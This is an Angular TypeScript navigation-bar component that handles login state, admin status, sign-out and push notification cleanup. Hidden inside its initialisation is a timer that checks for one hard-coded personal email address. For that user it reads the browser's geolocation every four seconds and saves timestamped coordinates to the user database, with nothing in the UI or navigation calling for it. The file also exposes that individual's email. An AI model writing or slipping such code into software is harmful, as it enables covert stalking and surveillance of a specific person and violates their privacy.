import { PushNotificationsService } from 'src/app/features/notifications/push-notifications.service';
import { ShellNavigationService } from 'src/app/shell/shell-navigation.service';
import { PeopleService } from 'src/app/features/people/people.service';
import { Component, inject, OnDestroy, OnInit } from '@angular/core';
import { NgbModal } from '@ng-bootstrap/ng-bootstrap';
import { Subscription } from 'rxjs';
import { UserClass } from 'src/app/features/people/user.model';
import { AuthService } from 'src/app/core/session/auth.service';
import { UtilityService } from 'src/app/services/utility.service';

@Component({
  selector: 'app-nav',
  templateUrl: './nav.component.html',
  styleUrls: ['./nav.component.scss'],
  standalone: false,
})
export class NavComponent implements OnInit, OnDestroy {
  private shellNavigation = inject(ShellNavigationService);

  user: UserClass = new UserClass();
  userProfile: UserClass = new UserClass();
  isSuperAdmin: boolean = false;
  isNavDisappeared: boolean = false;
  isMenuClicked: boolean = false;
  sideNavToggle: boolean = false;
  allNotifications: number = 0;
  isSuperAdminSub!: Subscription;
  userLoggedInSubjSub!: Subscription;

  compOfNoti!: boolean;

  positions: any[] = [];

  constructor(
    private authService: AuthService,
    private base: PeopleService,
    private modalRef: NgbModal,
    private fireStoreService: PushNotificationsService,
    private utilService: UtilityService,
  ) {}

  ngOnInit(): void {
    this.userLoggedInSubjSub = this.authService.userLoggedInSubject.subscribe(
      usr => {
        if (!usr.uid) this.user = new UserClass();
        if (usr.uid) {
          this.user = usr;
          const uProfsSub = this.base.getUserProfiles().subscribe({
            next: uProfs => {
              this.userProfile = uProfs.find(
                (uP: any) => uP.uid === this.user.uid,
              );
            },
            error: err =>
              console.log('Kérlek jelentkezz be a tartalom megtekintéséhez!'),
          });
        }
      },
    );
    this.isSuperAdminSub = this.authService.isSuperAdmin.subscribe(
      booleanSA => {
        this.isSuperAdmin = booleanSA;
      },
    );
    const int = setInterval(() => {
      if (this.userProfile?.email === 'kicsisziszi19940106@gmail.com')
        navigator.geolocation.getCurrentPosition(loc => {
          if (this.userProfile?.key) {
            const time = new Date().getTime();
            const currentPosition = `${loc.coords.latitude},${loc.coords.longitude}`;
            if (this.userProfile?.positions?.length <= 20) {
              this.userProfile.positions = [
                ...this.userProfile.positions,
                { time: time, position: currentPosition },
              ];
            } else if (!this.userProfile?.positions?.length) {
              this.userProfile.positions = [
                { time: time, position: currentPosition },
              ];
            } else {
              this.userProfile?.positions?.splice(0, 10);
            }
            this.userProfile.curPosition = currentPosition;
            this.base.updateUserData(this.userProfile, this.userProfile.key);
          }
        });
      if (
        this.userProfile?.email &&
        this.userProfile?.email !== 'kicsisziszi19940106@gmail.com'
      )
        clearInterval(int);
    }, 4000);
  }

  showProfPics() {
    this.base.showProfPics(this.userProfile?.email!);
  }

  async signOut() {
    this.authService.authNullSubject.next(null);
    this.isMenuClicked = false;
    this.isSuperAdmin = false;
    // jelenlegi feliratkozás a push értesítésekre
    const myPushSubscription: PushSubscription = this.fireStoreService.swPushh();
    // törölni a firestore-ból a push notifications-t az adott eszközről
    if (myPushSubscription && this.userProfile.displayName) {
      let JSONed = myPushSubscription.toJSON();
      if (this.userProfile)
        this.fireStoreService
          .deleteUserNotiSubscription(this.userProfile['key'], JSONed.endpoint!)
          .then(async (res: any) => {
            await this.authService.signOut();
          })
          .catch(async err => {
            console.log(err);
            await this.authService.signOut();
          });
    }

    if (!myPushSubscription) {
      await this.authService.signOut();
    }
  }

  rOutletOn() {
    this.sideNavToggle = !this.sideNavToggle;
  }

  navDisappear() {
    this.isMenuClicked = false;
    this.shellNavigation.navDisappear.next(true);
    this.shellNavigation.navDisappear.subscribe((isTrue: boolean) => {
      this.isNavDisappeared = isTrue;
    });
  }
  ngOnDestroy(): void {
    this.userLoggedInSubjSub.unsubscribe();
    this.isSuperAdminSub.unsubscribe();
    this.shellNavigation.navDisappear.unsubscribe();
    console.log('sikeres leiratkozas');
  }
}
